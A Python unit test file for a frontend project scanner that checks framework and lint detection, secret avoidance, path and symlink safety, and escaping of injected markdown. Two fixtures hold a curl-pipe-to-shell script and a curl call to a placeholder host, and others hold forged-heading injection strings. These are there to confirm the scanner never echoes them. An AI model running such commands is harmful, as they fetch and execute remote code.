#!/usr/bin/env python3
"""Tests for project_scan.py using isolated temporary projects."""

from __future__ import annotations

import io
import json
import os
import sys
import tempfile
import unittest
from contextlib import redirect_stdout
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT / "wow-frontend-design" / "scripts"))

import project_scan


class ProjectScanTests(unittest.TestCase):
    def test_detects_modern_frontend_signals_without_reading_secrets(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "package.json").write_text(
                json.dumps(
                    {
                        "scripts": {"build": "next build", "test": "playwright test"},
                        "packageManager": "pnpm@10.0.0",
                        "dependencies": {
                            "next": "1",
                            "react": "1",
                            "next-intl": "1",
                            "@react-three/fiber": "1",
                            "gsap": "1",
                        },
                        "devDependencies": {"@playwright/test": "1", "tailwindcss": "1"},
                    }
                ),
                encoding="utf-8",
            )
            (root / ".env").write_text("TOP_SECRET=do-not-read", encoding="utf-8")
            (root / "pnpm-lock.yaml").write_text("lockfileVersion: '9.0'\n", encoding="utf-8")
            (root / "app").mkdir()
            (root / "app" / "page.tsx").write_text(
                '<html lang="zh-Hant"><head><meta name="viewport" content="width=device-width" /></head></html>',
                encoding="utf-8",
            )
            (root / "app" / "globals.css").write_text(
                """
                :root { --ink: #111; }
                main { padding-inline: clamp(1rem, 3vw, 3rem); }
                a:focus-visible { outline: 2px solid; }
                @container (width > 30rem) { main { display: grid; } }
                @media (prefers-reduced-motion: reduce) { * { animation: none; } }
                """,
                encoding="utf-8",
            )

            report = project_scan.scan(root)

            self.assertEqual(report["mode_hint"], "RETROFIT")
            self.assertIn("Next.js", report["frameworks"])
            self.assertIn("React", report["frameworks"])
            self.assertIn("Tailwind CSS", report["styling_tools"])
            self.assertIn("React Three Fiber", report["experience_runtimes"])
            self.assertIn("GSAP", report["experience_runtimes"])
            self.assertIn("next-intl", report["localization_tools"])
            self.assertIn("Playwright", report["test_tools"])
            self.assertIn("pnpm-lock.yaml", report["lockfiles"])
            self.assertEqual(report["package_profiles"][0]["package_manager"], "pnpm@10.0.0")
            self.assertEqual(report["package_profiles"][0]["declared_versions"]["next"], "1")
            self.assertIn("zh-hant", report["language_tags"])
            self.assertEqual(report["frontend_signals"]["reduced motion"], 1)
            self.assertNotIn(".env", report["priority_files"])
            self.assertFalse(any("TOP_SECRET" in str(value) for value in report.values()))

    def test_surfaces_bounded_brand_evidence_candidates_without_promoting_them(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "DESIGN.md").write_text("# Visual contract\n", encoding="utf-8")
            (root / "BRAND.md").write_text("# Brand guidance\n", encoding="utf-8")
            (root / ".env").write_text("BRAND_SECRET=do-not-read\n", encoding="utf-8")

            styles = root / "styles"
            styles.mkdir()
            (styles / "brand.tokens.json").write_text("{}\n", encoding="utf-8")
            (styles / "product.resolver.json").write_text("{}\n", encoding="utf-8")

            public = root / "public"
            (public / "fonts").mkdir(parents=True)
            (public / "logo-primary.svg").write_text("<svg/>\n", encoding="utf-8")
            (public / "fonts" / "brand-display.woff2").write_bytes(b"font")
            campaign = public / "campaigns" / "summer"
            campaign.mkdir(parents=True)
            (campaign / "key-visual.webp").write_bytes(b"image")
            (campaign / "logo-lockup.svg").write_text("<svg/>\n", encoding="utf-8")
            (campaign / "headline.woff2").write_bytes(b"campaign-font")
            (campaign / "launch.resolver.json").write_text("{}\n", encoding="utf-8")
            (campaign / "theme.css").write_text(":root {}\n", encoding="utf-8")

            generated = root / "dist"
            generated.mkdir()
            (generated / "logo-stale.svg").write_text("<svg/>\n", encoding="utf-8")

            report = project_scan.scan(root)
            evidence = report["brand_evidence"]
            candidates = {(item["kind"], item["path"]) for item in evidence["candidates"]}

            self.assertEqual("candidate_only", evidence["status"])
            self.assertIn(("design_contract", "DESIGN.md"), candidates)
            self.assertIn(("brand_guidance", "BRAND.md"), candidates)
            self.assertIn(("token_source", "styles/brand.tokens.json"), candidates)
            self.assertIn(("token_resolver", "styles/product.resolver.json"), candidates)
            self.assertIn(("identity_asset", "public/logo-primary.svg"), candidates)
            self.assertIn(("font_asset", "public/fonts/brand-display.woff2"), candidates)
            self.assertIn(("campaign_overlay", "public/campaigns/summer/key-visual.webp"), candidates)
            self.assertIn(("campaign_overlay", "public/campaigns/summer/logo-lockup.svg"), candidates)
            self.assertIn(("campaign_overlay", "public/campaigns/summer/headline.woff2"), candidates)
            self.assertIn(("campaign_overlay", "public/campaigns/summer/launch.resolver.json"), candidates)
            self.assertIn(("campaign_overlay", "public/campaigns/summer/theme.css"), candidates)
            self.assertNotIn(("identity_asset", "public/campaigns/summer/logo-lockup.svg"), candidates)
            self.assertNotIn(("font_asset", "public/campaigns/summer/headline.woff2"), candidates)
            self.assertNotIn(("token_source", "public/campaigns/summer/theme.css"), candidates)
            self.assertNotIn(".env", str(evidence))
            self.assertNotIn("logo-stale.svg", str(evidence))
            self.assertIn("does not establish approval", evidence["claim_boundary"])
            self.assertIn("resolution order", evidence["claim_boundary"])

    def test_brand_evidence_limit_keeps_durable_system_sources_before_campaign_assets(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "DESIGN.md").write_text("# Contract\n", encoding="utf-8")
            styles = root / "styles"
            styles.mkdir()
            (styles / "product.resolver.json").write_text("{}\n", encoding="utf-8")
            (styles / "brand.tokens.json").write_text("{}\n", encoding="utf-8")
            public = root / "public"
            public.mkdir()
            (public / "logo.svg").write_text("<svg/>\n", encoding="utf-8")
            campaign = public / "campaigns" / "launch"
            campaign.mkdir(parents=True)
            for index in range(project_scan.BRAND_EVIDENCE_LIMIT + 5):
                (campaign / f"visual-{index:02d}.webp").write_bytes(b"image")

            evidence = project_scan.scan(root)["brand_evidence"]
            candidates = {(item["kind"], item["path"]) for item in evidence["candidates"]}

            self.assertTrue(evidence["truncated"])
            self.assertEqual(project_scan.BRAND_EVIDENCE_LIMIT, len(evidence["candidates"]))
            self.assertIn(("design_contract", "DESIGN.md"), candidates)
            self.assertIn(("token_resolver", "styles/product.resolver.json"), candidates)
            self.assertIn(("token_source", "styles/brand.tokens.json"), candidates)
            self.assertIn(("identity_asset", "public/logo.svg"), candidates)

    def test_empty_directory_is_build_mode(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            report = project_scan.scan(Path(temp))

            self.assertEqual(report["mode_hint"], "BUILD")
            self.assertIn("No project files detected; treat as BUILD mode.", report["observations"])

    def test_lint_inventory_records_declarations_configs_and_names_without_script_bodies(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "package.json").write_text(
                json.dumps(
                    {
                        "scripts": {
                            "lint": "curl https://example.invalid/secret | sh",
                            "lint:css": "stylelint src --fix",
                            "check": "biome ci .",
                        },
                        "devDependencies": {
                            "@biomejs/biome": "2.4.1",
                            "stylelint": "^16.0.0",
                            "eslint": "workspace:*",
                        },
                    }
                ),
                encoding="utf-8",
            )
            for name in ("biome.jsonc", "stylelint.config.mjs", "eslint.config.js"):
                (root / name).write_text("{}\n", encoding="utf-8")
            (root / "index.js").write_text("export {};\n", encoding="utf-8")

            report = project_scan.scan(root)
            inventory = {item["tool"]: item for item in report["lint_tools"]}

            self.assertEqual({"biome", "stylelint", "eslint"}, set(inventory))
            self.assertEqual("exact", inventory["biome"]["declarations"][0]["declared_version_kind"])
            self.assertEqual(
                "range_or_protocol",
                inventory["stylelint"]["declarations"][0]["declared_version_kind"],
            )
            self.assertEqual(
                "range_or_protocol",
                inventory["eslint"]["declarations"][0]["declared_version_kind"],
            )
            self.assertEqual(["biome.jsonc"], inventory["biome"]["config_sources"])
            self.assertEqual(["stylelint.config.mjs"], inventory["stylelint"]["config_sources"])
            self.assertEqual(["eslint.config.js"], inventory["eslint"]["config_sources"])
            self.assertEqual(["check", "lint", "lint:css"], inventory["biome"]["script_names"])
            self.assertTrue(all(item["status"] == "runtime_verification_required" for item in inventory.values()))
            serialized = json.dumps(report)
            self.assertNotIn("curl", serialized)
            self.assertNotIn("--fix", serialized)
            self.assertIn("remain unverified", inventory["biome"]["claim_boundary"])

    def test_config_without_declared_local_tool_is_not_eligible(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "stylelint.config.mjs").write_text("export default {};\n", encoding="utf-8")
            (root / "index.css").write_text("body {}\n", encoding="utf-8")

            report = project_scan.scan(root)

            self.assertEqual("not_eligible", report["lint_tools"][0]["status"])
            self.assertEqual([], report["lint_tools"][0]["declarations"])
            self.assertTrue(any("keep the adapter disabled" in item for item in report["observations"]))

    def test_plugins_and_lint_named_script_do_not_invent_a_lint_tool(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "package.json").write_text(
                json.dumps(
                    {
                        "scripts": {"lint": "curl https://example.invalid/secret"},
                        "devDependencies": {"eslint-plugin-example": "1.0.0"},
                    }
                ),
                encoding="utf-8",
            )
            (root / "index.js").write_text("export {};\n", encoding="utf-8")

            report = project_scan.scan(root)

            self.assertEqual([], report["lint_tools"])
            self.assertNotIn("curl", json.dumps(report))

    def test_declaration_only_and_cross_workspace_config_remain_ineligible(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            app_a = root / "apps" / "a"
            app_b = root / "apps" / "b"
            app_a.mkdir(parents=True)
            app_b.mkdir(parents=True)
            (app_a / "package.json").write_text(
                json.dumps({"devDependencies": {"@biomejs/biome": "2.4.1"}}),
                encoding="utf-8",
            )
            (app_a / "index.js").write_text("export {};\n", encoding="utf-8")
            (app_b / "biome.json").write_text("{}\n", encoding="utf-8")

            report = project_scan.scan(root)
            biome = [item for item in report["lint_tools"] if item["tool"] == "biome"]

            self.assertEqual(["declaration_only", "not_eligible"], [item["status"] for item in biome])
            self.assertEqual([], biome[0]["config_sources"])
            self.assertEqual(["apps/b/biome.json"], biome[1]["config_sources"])
            self.assertTrue(any("same-scope" in item for item in report["observations"]))

    def test_disabled_or_backup_config_names_are_not_inventory_sources(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / ".eslintrc-backup").write_text("{}\n", encoding="utf-8")
            (root / "stylelint.config.js.disabled").write_text("{}\n", encoding="utf-8")
            (root / "index.css").write_text("body {}\n", encoding="utf-8")

            report = project_scan.scan(root)

            self.assertEqual([], report["lint_tools"])

    def test_existing_razor_project_is_not_misclassified_as_build(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            view = root / "Views" / "Home"
            view.mkdir(parents=True)
            (view / "Index.cshtml").write_text(
                '<main lang="zh-Hant"><h1>既有介面</h1></main>', encoding="utf-8"
            )

            report = project_scan.scan(root)

            self.assertEqual(report["mode_hint"], "RETROFIT")
            self.assertIn("ASP.NET/Razor (file signal)", report["frameworks"])

    def test_unrecognized_nonempty_project_requires_review(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "README.md").write_text("existing project", encoding="utf-8")

            report = project_scan.scan(root)

            self.assertEqual(report["mode_hint"], "UNKNOWN_REVIEW_REQUIRED")
            self.assertTrue(any("manual review is required" in item for item in report["observations"]))

    def test_file_limit_is_reported(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            for index in range(3):
                (root / f"file-{index}.html").write_text("<main></main>", encoding="utf-8")

            report = project_scan.scan(root, max_files=2)

            self.assertTrue(report["scan_truncated"])
            self.assertEqual(report["file_count"], 2)

    def test_directory_limit_stops_empty_tree_traversal(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            for index in range(4):
                (root / f"empty-{index}").mkdir()

            files, truncated = project_scan.collect_files(
                root,
                max_files=100,
                max_directories=2,
            )

            self.assertEqual([], files)
            self.assertTrue(truncated)

    def test_per_directory_entry_limit_stops_wide_tree(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            for index in range(4):
                (root / f"file-{index}.html").write_text("<main></main>", encoding="utf-8")

            files, truncated = project_scan.collect_files(
                root,
                max_files=100,
                max_directory_entries=2,
            )

            self.assertEqual([], files)
            self.assertTrue(truncated)

    def test_pending_directory_queue_never_exceeds_total_budget(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            for name in ("a", "b"):
                child = root / name
                child.mkdir()
                (child / "nested").mkdir()

            files, truncated = project_scan.collect_files(
                root,
                max_files=100,
                max_directories=3,
            )

            self.assertEqual([], files)
            self.assertTrue(truncated)

    def test_detects_frameworks_in_nested_workspace_packages(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            app = root / "apps" / "web"
            app.mkdir(parents=True)
            (root / "pnpm-workspace.yaml").write_text("packages:\n  - apps/*\n", encoding="utf-8")
            (root / "site-manifest.json").write_text("{}\n", encoding="utf-8")
            (root / "wireframe-plan.json").write_text("{}\n", encoding="utf-8")
            (root / "DESIGN.md").write_text("# Design system\n", encoding="utf-8")
            (app / "package.json").write_text(
                json.dumps(
                    {
                        "scripts": {"build": "vite build"},
                        "dependencies": {"vue": "1", "vue-i18n": "1"},
                        "devDependencies": {"vite": "1"},
                    }
                ),
                encoding="utf-8",
            )
            (app / "main.vue").write_text("<template><main>首頁</main></template>", encoding="utf-8")

            report = project_scan.scan(root)

            self.assertIn("Vue", report["frameworks"])
            self.assertIn("Vite", report["frameworks"])
            self.assertIn("Vue I18n", report["localization_tools"])
            self.assertIn("apps/web: build", report["package_scripts"])
            self.assertIn("pnpm-workspace.yaml", report["manifests"])
            self.assertIn("site-manifest.json", report["manifests"])
            self.assertIn("wireframe-plan.json", report["manifests"])
            self.assertIn("DESIGN.md", report["manifests"])

    def test_project_root_must_stay_inside_authorized_root_without_symlinks(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            base = Path(temp)
            authorized = base / "authorized"
            project = authorized / "project"
            outside_project = base / "outside" / "project"
            project.mkdir(parents=True)
            outside_project.mkdir(parents=True)

            self.assertEqual(
                project.resolve(), project_scan.resolve_project_root(project, authorized)
            )
            with self.assertRaisesRegex(project_scan.ProjectRootError, "escapes authorized"):
                project_scan.resolve_project_root(outside_project, authorized)

            jump = authorized / "jump"
            jump.symlink_to(base / "outside", target_is_directory=True)
            with self.assertRaisesRegex(project_scan.ProjectRootError, "symlink component"):
                project_scan.resolve_project_root(jump / "project", authorized)

    @unittest.skipUnless(
        project_scan.DESCRIPTOR_ANCHORING_AVAILABLE,
        "requires descriptor-relative project I/O",
    )
    def test_descriptor_anchored_reader_rejects_parent_directory_swap(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            base = Path(temp)
            authorized = base / "authorized"
            project = authorized / "project"
            source = project / "src"
            outside_source = base / "outside" / "src"
            source.mkdir(parents=True)
            outside_source.mkdir(parents=True)
            (source / "app.css").write_text("inside", encoding="utf-8")
            (outside_source / "app.css").write_text("outside", encoding="utf-8")

            with project_scan.open_project_tree(project, authorized) as tree:
                files, truncated = tree.collect_files(max_files=10)
                target = next(path for path in files if path.name == "app.css")
                source.rename(project / "src-original")
                source.symlink_to(outside_source, target_is_directory=True)

                with self.assertRaises(project_scan.UnsafeProjectFileError):
                    tree.read_text(target)

            self.assertFalse(truncated)

    @unittest.skipUnless(
        project_scan.DESCRIPTOR_ANCHORING_AVAILABLE,
        "requires descriptor-relative project I/O",
    )
    def test_descriptor_anchored_reader_stays_on_opened_project_root(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            base = Path(temp)
            authorized = base / "authorized"
            project = authorized / "project"
            outside_project = base / "outside" / "project"
            project.mkdir(parents=True)
            outside_project.mkdir(parents=True)
            (project / "app.css").write_text("inside", encoding="utf-8")
            (outside_project / "app.css").write_text("outside", encoding="utf-8")

            with project_scan.open_project_tree(project, authorized) as tree:
                files, _ = tree.collect_files(max_files=10)
                target = next(path for path in files if path.name == "app.css")
                project.rename(authorized / "project-original")
                project.symlink_to(outside_project, target_is_directory=True)

                self.assertEqual("inside", tree.read_text(target))

    @unittest.skipUnless(hasattr(os, "mkfifo"), "requires POSIX FIFOs")
    def test_non_regular_project_entries_are_not_collected(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            os.mkfifo(root / "package.json")
            os.mkfifo(root / "hang.py")

            files, truncated = project_scan.collect_files(root, max_files=10)

            self.assertEqual([], files)
            self.assertFalse(truncated)
            for path in (root / "package.json", root / "hang.py"):
                with self.assertRaises(project_scan.UnsafeProjectFileError):
                    project_scan._read_bounded_regular_bytes(path)

    def test_oversized_package_json_is_not_read(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            package = root / "package.json"
            package.write_text(
                json.dumps({"name": "oversized", "padding": "x" * project_scan.MAX_READ_BYTES}),
                encoding="utf-8",
            )

            report = project_scan.scan(root)

            self.assertEqual([], report["package_profiles"])
            self.assertTrue(any("exceeds" in warning for warning in report["observations"]))

    def test_deep_package_json_is_reported_instead_of_crashing(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "package.json").write_text("[" * 1_100 + "]" * 1_100, encoding="utf-8")

            report = project_scan.scan(root)

            self.assertEqual([], report["package_profiles"])
            self.assertTrue(any("could not be parsed" in warning for warning in report["observations"]))

    def test_oversized_code_file_is_not_read(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            source = root / "page.tsx"
            source.write_text(
                '<html lang="unsafe">' + "x" * project_scan.MAX_READ_BYTES,
                encoding="utf-8",
            )

            report = project_scan.scan(root)

            self.assertEqual("RETROFIT", report["mode_hint"])
            self.assertNotIn("unsafe", report["language_tags"])

    def test_markdown_neutralizes_project_control_characters(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "package.json").write_text(
                json.dumps(
                    {
                        "scripts": {"build\n\n## forged script directive\u202e": "noop"},
                        "packageManager": "npm@1\n\n## forged package evidence",
                        "dependencies": {"react": "1\n\n## forged version gate"},
                    }
                ),
                encoding="utf-8",
            )
            injected_path = root / "page\n\n## forged inspect directive.tsx"
            injected_path.write_text("<main/>", encoding="utf-8")

            markdown = project_scan.render_markdown(project_scan.scan(root))

            self.assertNotIn("\n## forged", markdown)
            self.assertIn("\\u000a\\u000a\\u0023\\u0023 forged", markdown)
            self.assertIn("\\u202e", markdown)

    def test_cli_defaults_to_json_machine_contract(self) -> None:
        with tempfile.TemporaryDirectory() as temp:
            root = Path(temp)
            (root / "index.html").write_text("<main></main>", encoding="utf-8")
            output = io.StringIO()

            with redirect_stdout(output):
                exit_code = project_scan.main(
                    [str(root), "--authorized-root", str(root)]
                )

            self.assertEqual(0, exit_code)
            self.assertEqual(str(root.resolve()), json.loads(output.getvalue())["root"])


if __name__ == "__main__":
    unittest.main()
